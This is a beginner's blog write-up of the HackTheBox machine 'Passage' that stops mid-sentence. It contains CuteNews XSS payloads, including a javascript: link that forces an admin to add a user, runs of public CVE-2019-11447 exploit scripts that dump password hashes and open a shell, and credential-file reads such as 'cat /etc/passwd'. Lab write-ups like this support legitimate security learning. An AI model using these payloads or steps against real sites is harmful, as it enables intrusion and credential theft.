---
layout: post
title: HackTheBox Notes &emdash; Passage
---

This machine is currently active, and is my first attempt at HTB.  Its IP address is `10.10.10.206`.

After pinging it, I have run
```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV 10.10.10.206
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-23 18:37 EST
Nmap scan report for 10.10.10.206
Host is up (0.70s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)
|   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)
|_  256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Passage News
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 102.67 seconds
```

From this, we see that port `80` is open in http.  I edited `/etc/hosts` so that it now looks like this:
```bash
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.10.10.206    passage

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

You can see where I have added `passage`; the machine we are trying to hack.

Now going into the web browser and typing `http://passage:80`, we get a website!  Horay!

This page is a news page.  The only news article here that is not in Latin is named
```
**Implemented Fail2Ban**
```

I click on this and this is the body:

```
Due to unusally large amounts of traffic, we have implementated Fail2Ban on our website. Let it be known that excessive access to our server will be met with a two minute ban on your IP Address. While we do not wish to lock out our legitimate users, this decision is necessary in order to ensure a safe viewing experience. Please proceed with caution as you browse through our extensive news selection. View & Comment 
```

There is a comments box.  My very first thought was SQL Injections, but then I was reminded of PHP, so I tried commenting something using PHP.  Nothing happened (though the comment did go through).  Then I tried JavaScript, as one of the comments wrote 
```html
<script>alert(5)</script>
```

However, after attempting to write
```html
<script>console.log("Test")</script>
```
The page broke, and I had to go back to the main page, at which point both comments previously there were gone.  I cannot recall what the first comment had said.  I have no idea why 

I also noted that the admin who posted this has the link to an email address: `nadav@passave.htb`.  This might, I think, come in handy with the other open port: `ssh`.

I came to a realisation: why can't I simply google what I want.  I searched `comments section exploit` but didn't find much.  However, after literally searching `cutenews exploit` and finding [this](https://www.exploit-db.com/exploits/10002), I tried the following:
```
[link=javascript://%0adocument.write('<script>alert(/xss/)</script>')]funny pictures[/link]
```

[link=javascript://%0adocument.write('<script>window.open("http://passage/index.php?regusername=a&regpassword=a&regnickname=a&regemail=a%40a.com&reglevel=1&action=adduser&mod=editusers","_self")</script>')]funny pictures[/link]

[Project options > Misc > Embedded Browser > Allow the embedded browser to run without a sandbox](https://hooya0011.tistory.com/84)

After trying a lot of those exploits, I appended my search with `git`, and found [this repo](https://github.com/CRFSlick/CVE-2019-11447-POC), which I cloned.  I then made a CuteNews account for Passage by putting `/CuteNews/` before `index.php`, and logged into CuteNews using this python script, and uploaded the evil image (`sad.gif`).  This gave me a reverse shell, but it wasn't quite what I wanted; every command I ran gave me a bunch of HTML.  I needed to find a similar exploit, but this one wasn't working.

I went back to my Google search and found [this](https://github.com/mt-code/CVE-2019-11447).  I ran this, which uploads a php shell file as my avatar.  After that was successful, I must admit I was a little lost: how do I now use this exploit?  I went back to my refined search once again and found [this](https://raw.githubusercontent.com/musyoka101/CuteNews_2.1.2_RCE_exploit/master/exploit.py) exploit script, which I then ran and put the URL in, as well as my user credentials, and voila&emdash;: a reverse shell!

```
┌──(kali㉿kali)-[~/testing]
└─$ python3 exploit.py                                                                                                                                                                             1 ⨯ 2 ⚙



           _____     __      _  __                     ___   ___  ___ 
          / ___/_ __/ /____ / |/ /__ _    _____       |_  | <  / |_  |
         / /__/ // / __/ -_)    / -_) |/|/ (_-<      / __/_ / / / __/ 
         \___/\_,_/\__/\__/_/|_/\__/|__,__/___/     /____(_)_(_)____/ 
                                ___  _________                        
                               / _ \/ ___/ __/                        
                              / , _/ /__/ _/                          
                             /_/|_|\___/___/                          
                                                                      

                                                                                                                                                   

Enter the URL> http://passage:80
================================================================
Users SHA-256 HASHES TRY CRACKING THEM WITH HASHCAT OR JOHN
================================================================
7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc
================================================================

================================================================

================================================================
Possible users
================================================================
kim@example.com
paul@passage.htb
sid@example.com
nadav@passage.htb
================================================================

Do You Have a valid credential: [yes] or [no] ==> yes

[*] Please enter the credentials below
    Username ==> Christopher Tatlock
    Password ==> W@ci5M%QS^Kr8x3ov7!7
[+] Login was successfull

================================================================
Sending Payload
================================================================
signature_key: fad251d607c5ac7ebd52ada5f4c48144-Christopher Tatlock
signature_dsi: 7d4328bd3891236ddce1cb524aeda03b
logged in user: Christopher Tatlock

============================
Dropping to a SHELL
============================

command >
```

I ran `ls /home/` and saw the users `nadav` (that admin we noted earlier) and `paul`; neat!  I recall that there is an `ssh` port open, so I try to make a user for myself (I have done this before; it is trivial for Linux users).  The only tricky thing is that this shell is very minimal and only has `stdout`, I believe.  To get around this, I might show everything as stdout by
```bash
<cmd> 2>&1
```

```bash
command > cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:109:117::/nonexistent:/bin/false
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
saned:x:119:127::/var/lib/saned:/bin/false
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
nadav:x:1000:1000:Nadav,,,:/home/nadav:/bin/bash
paul:x:1001:1001:Paul Coles,,,:/home/paul:/bin/bash
sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin
```

We see `paul` and `nadav` down there, as users already, but we do not have access to the password.  We try to add our own user:
```bash
command > sudo useradd christopher 2>&1
sudo: no tty present and no askpass program specified
```
But it does not register our terminal very well (as the shell is minimal/bad).

---

One big take-home message from this&emdash; my first HTB task&emdash; is: just Google!  Unless you think you have a great idea what to try, if you are only starting out